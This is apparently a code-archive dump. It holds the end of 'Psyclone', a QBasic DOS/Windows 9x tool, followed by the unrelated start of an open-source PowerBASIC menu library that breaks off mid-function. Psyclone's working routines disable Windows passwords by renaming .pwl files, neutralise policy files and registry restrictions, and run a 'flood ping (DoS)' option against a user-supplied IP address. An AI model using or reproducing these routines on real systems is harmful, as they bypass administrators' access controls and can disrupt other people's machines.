+LOCATE 6, 20: COLOR 0, 4
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 7 TO 14: LOCATE x, 20:
+PRINT "³                             ³": NEXT
+LOCATE 15, 20
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+LOCATE 6, 35 - LEN(Titles2$) / 2
+PRINT Titles2$
+RETURN
+
+
+
+
+
+END SUB
+
+SUB MainMenu
+
+Titles$ = "Main Menu"
+scrn
+
+
+
+
+DO
+COLOR 0, 7
+
+LOCATE 7, 25: PRINT "What do you want to do?"
+LOCATE 9, 20: PRINT "1) Disable Windows Password"
+LOCATE 10, 20: PRINT "2) Disable Policy (.POL) Files"
+LOCATE 11, 20: PRINT "3) Disable Registry Restrictions"
+LOCATE 12, 20: PRINT "4) Reset BIOS settings"
+LOCATE 13, 20: PRINT "5) Kill Files"
+LOCATE 14, 20: PRINT "6) Net Utilities"
+LOCATE 15, 20: PRINT "7) Options"
+LOCATE 16, 20: PRINT "8) Quit"
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Main Menu": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= 8
+IF VAL(a$) = 1 THEN NoPassword: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 2 THEN NoPolicies: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 3 THEN KillRegMenu: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 4 THEN Bios: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 5 THEN KillFilesMenu: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 6 THEN NetUtilsMenu: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 7 THEN Options: Titles$ = "Main Menu": scrn
+IF VAL(a$) = 8 THEN Quit
+LOOP
+
+
+
+END SUB
+
+SUB NetUtilsMenu
+
+Titles$ = "Net Utilities"
+
+scrn
+
+COLOR 0, 7
+DO
+
+LOCATE 7, 25: PRINT "What do you want to do?"
+LOCATE 9, 25: PRINT "1) Flood ping a computer (DoS)"
+LOCATE 10, 25: PRINT "2) Back to main menu"
+'LOCATE 11, 25: PRINT "3) Perform DOS command"
+'LOCATE 12, 25: PRINT "4) Shell to DOS"
+'LOCATE 13, 25: PRINT "5) View a system file"
+'LOCATE 14, 25: PRINT "6) About this program"
+'LOCATE 15, 25: PRINT "7) Back to main menu"
+
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Net Utilities": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= 2
+
+IF VAL(a$) = 1 THEN GOSUB PingStuff: Titles$ = "Net Utilities": scrn
+IF VAL(a$) = 2 THEN EXIT SUB
+'IF VAL(a$) = 3 THEN GOSUB DosCom: Titles$ = "Options": scrn
+'IF VAL(a$) = 4 THEN SHELL "CLS": COLOR 7, 0: PRINT "Type 'EXIT' to return to Psyclone": SHELL: Titles$ = "Options": scrn
+'IF VAL(a$) = 5 THEN PsyText: Titles$ = "Options": scrn
+'IF VAL(a$) = 6 THEN About: Titles$ = "Options": scrn
+'IF VAL(a$) = 7 THEN EXIT SUB
+
+LOOP
+
+
+
+
+PingStuff:
+LOCATE 19, 11
+INPUT "Input an IP Address to flood ping:", IP$
+LOCATE 19, 11: PRINT "Press Control+C to quit pinging                            "
+SHELL "ping -t " + IP$ + " > " + TempDrive$ + "a.txt"
+DO: LOOP WHILE INKEY$ = ""
+
+RETURN
+
+
+END SUB
+
+SUB NoPassword
+
+SHELL "RENAME " + CurDrive$ + windir$ + "\*.pwl *.zzz > " + TempDrive$ + "a.tmp"
+undopassword = 1
+CLS
+
+Complete
+
+END SUB
+
+SUB NoPolicies
+
+SHELL CurDrive$
+SHELL "dir/s/b *.POL > " + TempDrive$ + "policy.txt"
+poldrive$ = TempDrive$
+OPEN TempDrive$ + "policy.txt" FOR INPUT AS #1
+ DO UNTIL EOF(1)
+ LINE INPUT #1, policy$
+ SHELL "rename " + policy$ + " *.zzy > " + TempDrive$ + "a.tmp"
+ LOOP
+CLOSE
+CLS
+Complete
+
+
+END SUB
+
+SUB Opening
+
+COLOR 4, 1
+CLS
+
+PRINT
+PRINT
+PRINT " ÛÛÛÛ       ÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ  ÛÛ      ÛÛ  ÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ"
+PRINT " ÛÛ ÛÛ     ÛÛ ÛÛ   ÛÛ           ÛÛ      ÛÛ  ÛÛ      ÛÛ      ÛÛ       ÛÛ      ÛÛ"
+PRINT " ÛÛ  ÛÛ   ÛÛ  ÛÛ   ÛÛ           ÛÛ      ÛÛ  ÛÛ      ÛÛ      ÛÛ       ÛÛ      ÛÛ"
+PRINT " ÛÛ   ÛÛ ÛÛ   ÛÛ   ÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛÛÛ      ÛÛ       ÛÛ      ÛÛ"
+PRINT " ÛÛ    ÛÛÛ    ÛÛ   ÛÛ           ÛÛ          ÛÛ      ÛÛ      ÛÛ       ÛÛ      ÛÛ"
+PRINT " ÛÛ           ÛÛ   ÛÛ           ÛÛ          ÛÛ      ÛÛ      ÛÛ       ÛÛ      ÛÛ"
+PRINT " ÛÛ           ÛÛ   ÛÛÛÛÛÛÛÛÛÛ   ÛÛ          ÛÛ      ÛÛ  ÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ"
+
+
+
+COLOR 0, 1
+
+y = 0
+
+FOR y = 1 TO 62
+PRINT
+LOCATE 10, y
+PRINT " ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ"
+LOCATE 11, y
+PRINT "   ÛÛÛÛÛÛÛÛÛÛÛÛÛÛ"
+LOCATE 12, y
+PRINT "    ÛÛÛÛÛÛÛÛÛÛ"
+LOCATE 13, y
+PRINT "    ÛÛÛÛÛÛÛÛ"
+LOCATE 14, y
+PRINT "      ÛÛÛÛÛ"
+LOCATE 15, y
+PRINT "       ÛÛÛ"
+LOCATE 16, y
+PRINT "       ÛÛÛ"
+LOCATE 17, y
+PRINT "        ÛÛÛ"
+LOCATE 18, y
+PRINT "         ÛÛ"
+LOCATE 19, y
+PRINT "          Û"
+LOCATE 20, y
+PRINT "         ÛÛ"
+LOCATE 21, y
+PRINT "        ÛÛ"
+LOCATE 22, y
+
+PRINT "        Û"
+
+IF y = 21 THEN LOCATE 10, 20: PRINT "P"
+IF y = 22 THEN LOCATE 10, 21: PRINT "R"
+IF y = 23 THEN LOCATE 10, 22: PRINT "E"
+IF y = 24 THEN LOCATE 10, 23: PRINT "S"
+IF y = 25 THEN LOCATE 10, 24: PRINT "E"
+IF y = 26 THEN LOCATE 10, 25: PRINT "N"
+IF y = 27 THEN LOCATE 10, 26: PRINT "T"
+IF y = 28 THEN LOCATE 10, 27: PRINT "S"
+
+'FOR delay = 1 TO 500: NEXT
+
+
+NEXT
+
+COLOR 16, 1
+
+LOCATE 12
+GOSUB Psyclone
+SLEEP 2
+
+COLOR 0, 1
+GOSUB Psyclone
+
+
+
+Psyclone:
+LOCATE 12
+PRINT " ÛÛÛÛÛÛ    ÛÛÛÛÛÛ ÛÛ  ÛÛ ÛÛÛÛÛÛ ÛÛ     ÛÛÛÛÛÛÛ ÛÛ   ÛÛ ÛÛÛÛÛÛ"
+PRINT "     ÛÛ    ÛÛ     ÛÛ  ÛÛ ÛÛ     ÛÛ     ÛÛ   ÛÛ ÛÛÛ  ÛÛ ÛÛ    "
+PRINT " ÛÛÛÛÛÛ    ÛÛ     ÛÛÛÛÛÛ ÛÛ     ÛÛ     ÛÛ   ÛÛ ÛÛ Û ÛÛ ÛÛÛÛÛÛ"
+PRINT " ÛÛ        ÛÛ       ÛÛ   ÛÛ     ÛÛ     ÛÛ   ÛÛ ÛÛ  ÛÛÛ ÛÛ    "
+PRINT " ÛÛ   ÛÛÛÛÛÛÛ       ÛÛ   ÛÛÛÛÛÛ ÛÛÛÛÛÛ ÛÛÛÛÛÛÛ ÛÛ   ÛÛ ÛÛÛÛÛÛ"
+RETURN
+
+time
+GOSUB Main
+
+Quit
+
+Main:
+
+MainMenu
+
+Title
+
+Quit
+RETURN
+
+
+END SUB
+
+SUB Options
+
+Titles$ = "Options"
+scrn
+
+COLOR 0, 7
+DO
+
+LOCATE 7, 25: PRINT "What do you want to do?"
+LOCATE 9, 25: PRINT "1) Change settings"
+LOCATE 10, 25: PRINT "2) Restore original settings"
+LOCATE 11, 25: PRINT "3) Perform DOS command"
+LOCATE 12, 25: PRINT "4) Shell to DOS"
+LOCATE 13, 25: PRINT "5) View a system file"
+LOCATE 14, 25: PRINT "6) About this program"
+LOCATE 15, 25: PRINT "7) Back to main menu"
+
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Options": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= 7
+
+IF VAL(a$) = 1 THEN ChangeSetting: Titles$ = "Options": scrn
+IF VAL(a$) = 2 THEN RestoreOriginal: Titles$ = "Options": scrn
+IF VAL(a$) = 3 THEN GOSUB DosCom: Titles$ = "Options": scrn
+IF VAL(a$) = 4 THEN SHELL "CLS": COLOR 7, 0: PRINT "Type 'EXIT' to return to Psyclone": SHELL: Titles$ = "Options": scrn
+IF VAL(a$) = 5 THEN PsyText: Titles$ = "Options": scrn
+IF VAL(a$) = 6 THEN About: Titles$ = "Options": scrn
+IF VAL(a$) = 7 THEN EXIT SUB
+
+LOOP
+
+
+
+
+DosCom:
+LOCATE 20, 10: PRINT "Input Dos Command:"
+LOCATE 21, 10: INPUT "", com$: SHELL com$
+PRINT "Press any key to continue"
+DO: LOOP WHILE INKEY$ = ""
+RETURN
+
+
+END SUB
+
+SUB PsyText
+
+
+Top = 3: Bottom = 22: Left = 2: Right = 79: Num = 1
+
+
+
+
+
+
+
+GOSUB Initialize
+
+
+
+
+
+COLOR 0, 7: LOCATE 1, 1
+PRINT "          Text Viewer for Psyclone                                              "
+LOCATE 2, 1: COLOR 7, 1
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 3 TO 22
+LOCATE x, 1
+PRINT "³                                                                              °"
+NEXT
+LOCATE 23, 1
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+LOCATE 3, 80: COLOR 0, 7: PRINT ""
+LOCATE 22, 80: PRINT ""
+
+       GOSUB Dimb
+
+LOCATE 2, 40 - LEN(Titles2$) / 2
+PRINT Titles2$
+
+
+GOSUB TextPutStuff
+
+
+DO
+b$ = INKEY$
+IF b$ <> "" THEN GOSUB PsyKeyHandle
+
+
+LOOP UNTIL b$ = CHR$(27)
+
+EXIT SUB
+
+
+
+'If Statements
+PsyKeyHandle:
+
+
+        IF RIGHT$(b$, 1) = "P" THEN
+         IF Num < MaxX - 1 THEN Num = Num + 1: GOSUB TextPutStuff
+        END IF
+        IF RIGHT$(b$, 1) = "H" THEN
+         IF Num > 1 THEN Num = Num - 1: GOSUB TextPutStuff
+        END IF
+        IF b$ = CHR$(0) + "O" THEN Num = MaxX - 1: GOSUB TextPutStuff
+        IF RIGHT$(b$, 1) = "G" THEN Num = 1: GOSUB TextPutStuff
+        IF RIGHT$(b$, 1) = "Q" THEN
+        IF Num + (Bottom - Top) < MaxX - 1 THEN
+         Num = Num + (Bottom - Top)
+        ELSE
+         Num = MaxX - 1
+        END IF
+        GOSUB TextPutStuff
+
+END IF
+
+IF RIGHT$(b$, 1) = "I" THEN
+ IF Num - (Bottom - Top) > 1 THEN
+   Num = Num - (Bottom - Top)
+ ELSE
+   Num = 1
+ END IF
+GOSUB TextPutStuff
+
+
+
+END IF
+'End if Statements
+COLOR 0, 7: LOCATE 1, 60
+PRINT Num; : PRINT "|"; : PRINT MaxX - 1; : PRINT "  "
+
+'PRINT "    Text Viewer for Psyclone                                                    "
+
+
+'F1 = ;
+'F2 = <
+'F3 = =
+'F4 = >
+'F5 = ?
+'F6 = @
+'F7 = A
+'F8 = B
+'F9 = C
+'F10 = D
+'F11 = …
+'F12 = †
+'Delete = S
+'End = O
+'Insert = R
+'Home = G
+'PAGE UP = I
+'PAGE DOWN = Q
+'UP ARROW = H
+'DOWN  ARROW = P
+'LEFT ARROW = K
+'RIGHT ARROW = M
+
+
+RETURN
+
+
+TextPutStuff:
+
+
+COLOR 7, 1
+OldX = Num
+Num = Num - 1
+FOR y = Top TO Bottom
+Num = Num + 1
+
+LOCATE y, Left: PRINT STRING$(78, " ")
+LOCATE y, Left: PRINT RIGHT$(Phrase2$(Num), 79)
+IF LEN(Phrase2$(Num)) > 78 THEN LOCATE y, 80: PRINT "°"
+
+NEXT
+
+Num = OldX
+RETURN
+
+
+
+
+
+
+
+
+Dimb:
+
+
+OPEN File$ FOR INPUT AS #1
+x = 1
+DO
+LINE INPUT #1, Phrase2$(x)
+x = x + 1
+
+LOOP UNTIL EOF(1)
+MaxX = x
+CLOSE
+
+
+RETURN
+
+
+
+
+
+Initialize:
+COLOR 0, 7
+LOCATE 6, 25: PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 7 TO 14
+LOCATE x, 25: PRINT "³                            ³": NEXT
+LOCATE 15, 25: PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+LOCATE 7, 30: PRINT "What system file do"
+LOCATE 8, 30: PRINT "you want to view?"
+LOCATE 10, 32: PRINT "< "; : COLOR 15, 7: PRINT "A"; : COLOR 0, 7: PRINT "UTOEXEC.BAT >"
+LOCATE 11, 32: PRINT "< "; : COLOR 15, 7: PRINT "M"; : COLOR 0, 7: PRINT "SDOS.SYS >"
+LOCATE 12, 32: PRINT "< C"; : COLOR 15, 7: PRINT "O"; : COLOR 0, 7: PRINT "NFIG.SYS >"
+LOCATE 13, 32: PRINT "< "; : COLOR 15, 7: PRINT "C"; : COLOR 0, 7: PRINT "ANCEL >"
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN EXIT SUB
+IF UCASE$(a$) = "C" THEN EXIT SUB
+IF UCASE$(a$) = "A" THEN File$ = CurDrive$ + "Autoexec.bat": Titles2$ = " AUTOEXEC.BAT ": EXIT DO
+IF UCASE$(a$) = "M" THEN File$ = CurDrive$ + "Msdos.sys": Titles2$ = " MSDOS.SYS ": EXIT DO
+IF UCASE$(a$) = "O" THEN File$ = CurDrive$ + "Config.sys": Titles2$ = " CONFIG.SYS ": EXIT DO
+
+LOOP
+
+
+RETURN
+
+
+END SUB
+
+SUB Quit
+
+KILL poldrive$ + "policy.txt"
+KILL TempDrive$ + "a.tmp"
+COLOR 7, 0
+CLS
+END
+
+END SUB
+
+SUB RestoreOriginal
+
+total = 7
+Titles$ = "Restore Original Settings"
+scrn
+
+DO
+
+COLOR 0, 7
+
+
+LOCATE 7, 20: PRINT "What setting do you want to restore?"
+LOCATE 9, 20: PRINT "1) All"
+LOCATE 10, 20: PRINT "2) Windows Password"
+LOCATE 11, 20: PRINT "3) Policy Files"
+LOCATE 12, 20: PRINT "4) Location Setting (temp drive, windows dir)"
+LOCATE 13, 20: PRINT "5) Restore Registry"
+LOCATE 14, 20: PRINT "6) MSDOS.SYS (Not included in restore all"
+LOCATE 15, 20: PRINT "7) Go Back"
+
+
+
+
+DO
+a$ = INKEY$
+IF a$ = CHR$(27) THEN Quit
+IF RIGHT$(a$, 1) = ";" THEN HelpMenu: Titles$ = "Restore Original Settings": scrn: EXIT DO
+LOOP UNTIL VAL(a$) > 0 AND VAL(a$) <= total
+
+IF VAL(a$) = 1 THEN GOSUB alls
+IF VAL(a$) = 2 THEN SHELL "Rename " + CurDrive$ + windir$ + "\*.zzz *.pwl": Complete
+IF VAL(a$) = 3 THEN GOSUB pol
+IF VAL(a$) = 4 THEN CurDrive$ = "C:\": windir$ = "WINDOWS": TempDrive$ = "C:\": Complete
+IF VAL(a$) = 5 THEN SHELL "C:\REGEDIT c:\unreg.reg": SHELL "C:\REGEDIT c:\unreg2.reg": Complete
+IF VAL(a$) = 6 THEN GOSUB RestoreMSDOS.SYS: Complete
+IF VAL(a$) = 7 THEN EXIT SUB
+
+
+LOOP
+
+
+alls:
+CurDrive$ = "C:\"
+windir$ = "WINDOWS"
+TempDrive$ = "C:\"
+SHELL "Rename " + CurDrive$ + windir$ + "\*.zzz *.pwl > " + TempDrive$ + "a.txt"
+SHELL "C:\REGEDIT C:\unreg.reg"
+SHELL "C:\REGEDIT C:\unreg2.reg"
+GOSUB pol
+
+RETURN
+
+pol:
+
+SHELL CurDrive$
+SHELL "dir/s/b *.zzy > " + poldrive$ + "policy.txt"
+OPEN poldrive$ + "policy.txt" FOR INPUT AS #1
+
+ DO UNTIL EOF(1)
+ LINE INPUT #1, policy$
+ SHELL "rename " + policy$ + " *.bas > " + TempDrive$ + "a.txt"
+ LOOP
+CLOSE
+Complete
+
+RETURN
+
+
+RestoreMSDOS.SYS:
+SHELL "copy " + TempDrive$ + "msdos.bak " + CurDrive$ + "msdos.sys > " + TempDrive$ + "a.txt"
+KILL TempDrive$ + "msdos.bak"
+RETURN
+
+END SUB
+
+SUB scrn
+
+
+COLOR 0, 1
+CLS
+
+'        COLOR 0, 1
+'        FOR x = 25 TO 2 STEP -1
+'        LOCATE x
+'        PRINT STRING$(80, "İ")
+'        NEXT
+      
+        FOR x = 1 TO 22 STEP 2
+        COLOR 14, 1
+        LOCATE x
+        PRINT "      Mephio      Mephio      Mephio      Mephio      Mephio      Mephio      M"
+        NEXT
+
+        FOR x = 1 TO 22
+        LOCATE x, 1: COLOR 7, 1: PRINT "³": LOCATE x, 80: PRINT "³"
+        NEXT
+
+        LOCATE 23, 1: PRINT "À"
+        LOCATE 23, 2: PRINT STRING$(79, "Ä")
+        LOCATE 23, 80: PRINT "Ù"
+COLOR 0, 7
+LOCATE 1, 1
+PRINT "    Escape to Exit    F1 for Help        Email me at Mephio2002@yahoo.com          "
+COLOR 7, 1
+LOCATE 2, 2: PRINT STRING$(78, "Ä")
+LOCATE 2, 80: PRINT "¿": LOCATE 2, 1: PRINT "Ú"
+COLOR 1, 7
+LOCATE 2, 35
+PRINT " PSYCLONE "
+
+
+
+
+LOCATE 5, 10
+COLOR 0, 7
+PRINT "ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿"
+FOR x = 1 TO 12
+LOCATE , 10
+PRINT "³                                                           ³"
+NEXT
+LOCATE , 10
+PRINT "ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´"
+LOCATE , 10
+PRINT "³                                                           ³"
+LOCATE , 10
+PRINT "ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ"
+
+
+LOCATE , 11: COLOR 7, 0
+PRINT "io      Mephio      Mephio      Mephio      Mephio      Mephi"
+
+FOR x = 6 TO 20 STEP 2
+LOCATE x + 1, 71: PRINT "io"
+LOCATE x, 71: PRINT "  "
+NEXT
+
+'DO
+'LOOP UNTIL INKEY$ = CHR$(27)
+Title
+
+
+END SUB
+
+SUB time
+t# = VAL(RIGHT$(TIME$, 2))
+
+DO
+b# = VAL(RIGHT$(TIME$, 2))
+IF INKEY$ <> "" THEN EXIT DO
+IF b# = t# + 5 THEN comp = 1
+IF b# < t# THEN b# = b# + 60
+
+
+LOOP UNTIL comp = 1
+
+
+END SUB
+
+SUB Title
+
+
+
+COLOR 0, 7
+LOCATE 5, 40 - (LEN(Titles$) / 2)
+PRINT Titles$
+
+
+END SUB
+
+ãScott/Buffington/Decker        Menu development system        royscott@royscott.net          09-15-02 (  :  )       PB                     1    36892    menubarv3b2.'MSD Project version 3 beta 2 (Menu System Development)
+'***************************************************
+'COPYWRITE: ROY SCOTT & ASSOCIATES 2002
+'AUTHORS: Roy Scott, Fred Buffington, Walt Decker
+'LICENSE: OPEN SOURCE FREEWARE
+'  You may use this in your programs, make it a part of
+'a compiled commercial product, and alter it to suit your
+'purposes.
+'  You may not, without the permission of the authors,
+'distribute it for sale, make it a part of a distributed
+'code collection for sale or in any way charge a fee for it.
+'  It is not legal to use this product without this
+'copyright header remaining intact. The authors assume no
+'liability of any kind for the use of this product. It is
+'up to the user to determine usability, fitness of purpose
+'and correct operation.
+'  To insure an uncorrupted product and be sure of getting
+'the latest version, it is reccommended that you download
+'it from: http://www.allbasiccode.com/.
+'***************************************************
+'All documentation for this product is in internal remarks
+
+%test = 1  '0=library, 1=testing
+
+#DIM ALL   'uncomment during testing
+
+TYPE Umenu                 'type for dropdown menus; it is
+                           'dimensioned in InitMenu to
+                           'the # MainMenu headings
+  NumItems      AS BYTE
+  Row(1 TO 10)  AS BYTE
+  Col(1 TO 10)  AS BYTE
+  MENU(1 TO 10) AS STRING * 12
+END TYPE
+
+TYPE MenuMain              'type for main menu
+  NumItems      AS BYTE    'Number of main menu headings
+  Row(1 TO 10)  AS BYTE    'beginning row
+  Col(1 TO 10)  AS BYTE    'beginning column
+  MENU(1 TO 10) AS STRING * 8
+END TYPE
+
+TYPE Box                   'container for MSGBOX look and
+                           'position.  Also used for menus
+  ULChar AS STRING * 1     'upper left corner
+  URChar AS STRING * 1     'upper right corner
+  LLChar AS STRING * 1     'lower left
+  LRChar AS STRING * 1     'lower right
+  HZChar AS STRING * 1     'horizontal
+  VTChar AS STRING * 1     'vertical
+  OKbutn AS STRING * 6     'button strings
+  Nobutn AS STRING * 6
+  ScrnX  AS BYTE           'screen size = CONSOLE SCREEN size
+  ScrnY  AS BYTE
+  BoxTyp AS BYTE           'BoxType, 0 = no button, 1 = OK button
+                           '2 = YES/NO buttons, 3 = inputbox +
+                           ' OK/CANCEL buttons
+  Uly    AS BYTE           'upper left corner of box
+  Ulx    AS BYTE
+  FGColr AS BYTE           'forground color for msgbox
+  BGColr AS BYTE           'background color for msgbox
+  MuFclr AS BYTE           'forground color for menu
+  MuBclr AS BYTE           'background color for menu
+  MuHFcl AS BYTE           'forground highlight color for menu
+  MuHBcl AS BYTE           'background highlight color for menu
+END TYPE
+
+TYPE BUTTON                'type for buttons
+  Iny   AS BYTE            'input box location
+  Inx   AS BYTE
+  Oky   AS BYTE            'OK button location
+  Okx   AS BYTE
+  Noy   AS BYTE            'No/Cancel button location
+  Nox   AS BYTE
+  FOCUS AS BYTE            'button/input box focus
+END TYPE
+GLOBAL MessBox AS Box        'Container for menu and message
+                             ' box characters
+GLOBAL DoubleClick AS BYTE   'Define # of button clicks
+                             'if set requires double click
+SUB InitMenu(Mitems() AS Umenu, bitems AS MenuMain)
+'******************************************************************
+'this sub contains all of the modifyable data elements in one place
+'each section is defined by a lable to make it easier to identify
+'the sections. Samples define are for example only.
+'******************************************************************
+menubar:      'Main Menu
+'Row  Col  - can be changed to match your look
+DATA 1,   1
+'menubar no. of items (# of dropdown menus)
+DATA 4
+'menubar items data
+DATA " File"," Edit"," Seek"," Help"
+Menu1_data:    'Dropdown 1
+'Number of items in dropdown 1
+DATA 6
+'dropdown 1 items data
+DATA " New", " Open", " Save"," Save As"," Email"," Exit"
+Menu2_data:   'Dropdown 2
+'number of items in dropdown 2
+DATA 4
+'dropdown 2 items data
+DATA " Cut", " Copy", " Paste"," Delete"
+Menu3_data:  'Dropdown 3
+'number of items in dropdown 3
+DATA 3
+'dropdown 3 items data
+DATA " Find", " Replace", " Again"
+Menu4_data:  'Dropdown 4
+'number of items in dropdown 4
+DATA 2
+'dropdown 4 items data
+DATA " Help", " About"
+LOCAL Number AS LONG       'Number of dropdowns
+LOCAL accum AS LONG        'counters
+LOCAL I AS LONG, J AS LONG '    |
+LOCAL K AS LONG, L AS LONG '    |
+LOCAL M AS LONG, N AS LONG '    |
+MessBox.ULChar = CHR$(201)  ' UPPER LEFT CORNER
+MessBox.URChar = CHR$(187)  ' UPPER RIGHT CORNER
+MessBox.LLChar = CHR$(200)  ' LOWER LEFT CORNER
+MessBox.LRChar = CHR$(188)  ' LOWER RIGHT CORNER
+MessBox.HZChar = CHR$(205)  ' HORIZONTAL
+MessBox.VTChar = CHR$(186)  ' VERTICAL
+MessBox.ScrnY  = 28         ' NUMBER OF SCREEN ROWS
+MessBox.ScrnX  = 80         ' NUMBER OF SCREEN COLUMNS
+' ********* Dropdowm COLORS ************
+MessBox.MuFclr = 15    ' Normal Menu Char Color
+MessBox.MuBclr =  9    ' Normal Menu Char Background color
+MessBox.MuHFcl = 14    ' Highlight Menu Char Color
+MessBox.MuHBcl =  4    ' Highlight Menu Char Background color
+'********** Beginning of Executable code *************
+  Bitems.Row(1) = VAL(READ$(1)) 'Row for MenuBar
+  Bitems.Col(1) = VAL(READ$(2)) 'Col for MenuBar
+  Number = VAL(READ$(3))    '# of bar items (dropdown menus)
+  Bitems.NumItems = Number
+  accum = 4      'Set to # of bar items
+  FOR M = 1 TO Number      'bar item load loop
+    bitems.Menu(M) = READ$(accum)    'get data into array
+    '********* Change the following for a different look *********
+    IF M > 1 THEN     'calculate column for next print
+      Bitems.Row(M) = Bitems.Row(1)
+      Bitems.Col(M) = Bitems.Col(M - 1) + LEN(Bitems.Menu(M))
+    END IF
+    INCR Accum    'step data position
+  NEXT M          'next bar data item
+  REDIM Mitems(1 TO Number)    'an array of dropdown arrays
+  I = accum   'first item data position
+  L = 1       'inner loop seed
+  FOR J = 1 TO Number   'outer loop all dropdowns (# items in menu bar)
+    M = VAL(READ$(I))   '# of items in current dropdown menu
+    Mitems(L).NumItems = M
+    INCR I    'step data read position
+    FOR K = 1 TO M 'read each dropdown item
+      Mitems(L).MENU(K) = READ$(I)      'dropdown menu item
+      '********* Change this for a different look ******************************
+      Mitems(L).Col(K)  = Bitems.Col(J) 'start Column of menu item (X)
+      Mitems(L).Row(K)  = BitEms.Row(J) + K  'start Row or menu item (Y)
+      INCR I  'step data position
+    NEXT K    'next dropdown item
+    INCR L    'step dropdown position
+  NEXT J      'next dropdown menu
+END SUB
+
+FUNCTION KeyPress(Lmx AS LONG, Lmy AS LONG, Lbutton AS LONG) AS LONG
+'*******************************************
+' Gets key press and/or mouse events
+' Lmx = Row of Mouse cursor
+' Lmy = Column of Mouse cursor
+' Lbutton = button pressed
+'*******************************************
+LOCAL Key AS STRING         'string returned by WAITKEY$
+LOCAL LenKey AS LONG        'length of Key
+  Lbutton = 0                 'zero out Lbutton
+  Key = WAITKEY$              'wait for event
+  LenKey = LEN(Key)
+  SELECT CASE LenKey   'decide if keyboard or mouse event
+    CASE 1                'keyboard event
+      KeyPress = ASC(Key)
+    CASE 2                'Keyboard event
+      KeyPress = -ASC(Key, 2)
+    CASE 4                'Mouse Event
+      IF ISTRUE DoubleClick THEN  '2 clicks (DoubleClick > 0)
+        IF ASC(Key, 3) = 2 THEN Lbutton = ASC(Key, 4)
+      ELSE                '1 click (DoubleClick = 0)
+        IF ASC(Key, 3) = 4 THEN Lbutton = ASC(Key, 4)
+      END IF
+      Lmx = MOUSEX
+      Lmy = MOUSEY
+      KeyPress = 32767    'indicate mouse event
+  END SELECT
+END FUNCTION
+
+SUB ColorWords(Y AS LONG, X AS LONG, Fcolor AS INTEGER, _
+               Bcolor AS INTEGER, sWord AS STRING)
+'**********************************************
+' General purpose routine changes foreground and background
+' character colors at Row, Column
+' Fcolor = forground color
+' Bcolor = background color
+' sWord = string to display
+'**********************************************
+  LOCATE Y, X
+  COLOR Fcolor, Bcolor
+  PRINT sWord;
+END SUB
+
+FUNCTION FNMenu(Items AS Umenu) AS LONG
+'*******************************************
+' returns the number of the item selected
+' Items structure should be dimensioned 1 TO NumberOfItems
+' in dropdown
+' This handles type 0 message boxes, ie, dropdown menus.
+' With appropriate code, MSGBOX could handle this.
+'*******************************************
+LOCAL NumItems AS INTEGER  'Number of items in structure
+LOCAL I AS INTEGER         'Counter
+LOCAL Key    AS LONG       'Key code
+LOCAL MenuSize    AS LONG
+LOCAL LastItem    AS LONG  'Place holder
+LOCAL Row         AS LONG  'Current row
+LOCAL Col         AS LONG  'Current column
+LOCAL MenuTop     AS LONG  'first item in menu
+LOCAL Menu1()     AS STRING  'temporay array
+LOCAL tBox AS Box            'box structure
